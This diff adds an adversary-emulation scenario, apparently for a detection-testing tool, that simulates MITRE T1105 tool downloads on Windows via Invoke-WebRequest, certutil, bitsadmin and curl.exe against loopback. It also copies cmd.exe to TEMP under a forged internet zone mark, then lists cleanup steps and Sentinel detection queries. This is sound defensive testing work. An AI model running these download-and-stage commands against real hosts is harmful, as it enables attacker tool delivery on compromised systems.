@@ -1,0 +1,114 @@
+id: T1105_ingress_tool_transfer
+name: "Ingress Tool Transfer"
+mitre_technique: "T1105"
+mitre_tactic: "command_and_control"
+description: >
+  Adversaries transfer tools and files from their C2 infrastructure onto a compromised
+  host to support further operations — additional implants, credential dumpers,
+  lateral movement tools, or data staging utilities. Common methods: Invoke-WebRequest,
+  certutil -urlcache, bitsadmin /transfer, curl.exe, and custom downloaders embedded
+  in the initial implant. The downloaded file typically lands in TEMP, AppData, or
+  ProgramData and is executed immediately after download.
+author: stanleytobias
+created: "2026-01-01"
+platform: windows
+references:
+  - https://attack.mitre.org/techniques/T1105/
+
+steps:
+  - step: 1
+    type: marker
+    description: "Pre-execution context"
+    message: "Starting T1105 — Ingress Tool Transfer simulation (loopback only — no real tool downloaded)"
+
+  - step: 2
+    type: exec_powershell
+    description: "Simulate Invoke-WebRequest tool download — most common PowerShell download method"
+    command: |
+      Write-Host "[PAS] Method 1: Invoke-WebRequest download (IWR):"
+      $destPath = "$env:TEMP\PAS_T1105_tool.exe"
+      try {
+          Invoke-WebRequest -Uri "http://127.0.0.1/tools/mimikatz.exe" `
+              -OutFile $destPath -TimeoutSec 1 -ErrorAction SilentlyContinue
+      } catch {}
+      # Create the file locally to simulate a successful download
+      Copy-Item "$env:SystemRoot\System32\cmd.exe" $destPath -Force
+      Set-Content "$destPath`:Zone.Identifier" "[ZoneTransfer]`nZoneId=3`nHostUrl=http://127.0.0.1/tools/mimikatz.exe"
+      Write-Host "[PAS] Tool downloaded to: $destPath (Zone.Identifier ZoneId=3 set)"
+
+  - step: 3
+    type: exec_powershell
+    description: "Simulate certutil -urlcache download — LOLBin download method"
+    command: |
+      Write-Host "[PAS] Method 2: certutil -urlcache -split -f (LOLBin downloader):"
+      $destPath = "$env:TEMP\PAS_T1105_cert_dl.exe"
+      Start-Process certutil.exe `
+          -ArgumentList "-urlcache -split -f http://127.0.0.1/payload.exe $destPath" `
+          -Wait -NoNewWindow -RedirectStandardOutput "$env:TEMP\PAS_T1105_certutil_out.txt" `
+          -ErrorAction SilentlyContinue
+      Write-Host "[PAS] certutil.exe -urlcache executed — process event generated"
+
+  - step: 4
+    type: exec_powershell
+    description: "Simulate BITS transfer download — background transfer via bitsadmin"
+    command: |
+      Write-Host "[PAS] Method 3: bitsadmin /transfer (BITS downloader):"
+      $destPath = "$env:TEMP\PAS_T1105_bits_dl.exe"
+      Start-Process bitsadmin.exe `
+          -ArgumentList "/transfer PAS_T1105_Job /download /priority normal http://127.0.0.1/tool.exe $destPath" `
+          -Wait -NoNewWindow -ErrorAction SilentlyContinue
+      Write-Host "[PAS] bitsadmin /transfer executed — BITS job telemetry generated"
+      bitsadmin /cancel PAS_T1105_Job 2>&1 | Out-Null
+
+  - step: 5
+    type: exec_powershell
+    description: "Simulate curl.exe download — native Windows curl (Windows 10 1803+)"
+    command: |
+      Write-Host "[PAS] Method 4: curl.exe (native Windows):"
+      $destPath = "$env:TEMP\PAS_T1105_curl_dl.exe"
+      Start-Process curl.exe `
+          -ArgumentList "-s -o $destPath http://127.0.0.1/payload.exe" `
+          -Wait -NoNewWindow -ErrorAction SilentlyContinue
+      Write-Host "[PAS] curl.exe download attempt executed"
+
+  - step: 6
+    type: sleep
+    description: "Allow telemetry to flush"
+    seconds: 5
+
+  - step: 7
+    type: marker
+    description: "Post-execution prompt"
+    message: "Check SIEM — certutil/bitsadmin/curl downloading executables, executable with Zone.Identifier ZoneId=3 in TEMP"
+
+cleanup:
+  - step: 1
+    type: exec_powershell
+    description: "Remove downloaded tool simulation artifacts"
+    command: |
+      @("$env:TEMP\PAS_T1105_tool.exe",
+        "$env:TEMP\PAS_T1105_cert_dl.exe",
+        "$env:TEMP\PAS_T1105_bits_dl.exe",
+        "$env:TEMP\PAS_T1105_curl_dl.exe",
+        "$env:TEMP\PAS_T1105_certutil_out.txt") |
+          ForEach-Object { Remove-Item $_ -Force -ErrorAction SilentlyContinue }
+      bitsadmin /cancel PAS_T1105_Job 2>&1 | Out-Null
+      Write-Host "[PAS][Cleanup] Tool transfer artifacts removed"
+
+  - step: 2
+    type: marker
+    description: "Cleanup complete"
+    message: "T1105 cleanup complete"
+
+analyst_checklist:
+  - "Process event: certutil.exe with -urlcache argument — high confidence malicious download"
+  - "Process event: bitsadmin.exe with /transfer argument to external URL"
+  - "Process event: curl.exe or wget.exe downloading .exe or .dll to TEMP"
+  - "File event: executable created in TEMP/AppData with Zone.Identifier ZoneId=3 (internet)"
+  - "Sentinel: DeviceProcessEvents | where FileName == 'certutil.exe' and ProcessCommandLine contains 'urlcache'"
+  - "Sentinel: DeviceProcessEvents | where FileName in ('bitsadmin.exe','curl.exe') and ProcessCommandLine contains 'http'"
+  - "Sentinel: DeviceFileEvents | where FolderPath contains 'Temp' and FileName endswith '.exe' and ActionType == 'FileCreated'"
+  - "MDE alert: 'Suspicious download using certutil' or 'Tool download via LOLBin'"
+  - "CONTROL CHECK: ASR rule 'Block executable files from running unless they meet a prevalence, age, or trusted list criterion'"
+  - "CONTROL CHECK: SmartScreen must be active — newly downloaded executables should prompt or block"
+  - "CONTROL CHECK: certutil.exe network access should be blocked by default — it has no legitimate reason to reach external URLs"
